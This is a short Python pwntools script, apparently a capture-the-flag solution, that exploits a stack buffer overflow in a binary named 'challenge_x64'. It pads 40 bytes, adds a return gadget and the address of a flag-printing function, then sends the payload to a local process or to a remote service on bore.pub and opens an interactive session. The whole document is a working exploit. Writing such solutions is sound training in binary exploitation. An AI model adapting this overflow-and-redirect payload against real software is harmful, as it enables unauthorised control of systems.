from pwn import *

elf = ELF('./challenge_x64')
context.binary = elf

offset = 40
ret_address = 0x0040101a
flag_address = 0x401276

payload = b'A' * offset
payload += pack(ret_address)
payload += pack(flag_address)

# test locally first
p = process('./challenge_x64')
# or
p = remote('bore.pub', 31338)

# Send 1 after receive '>'
p.sendlineafter(b'>', b'1')

# Send payload after getting 'name?'
p.sendlineafter(b'name? ', payload)

p.interactive()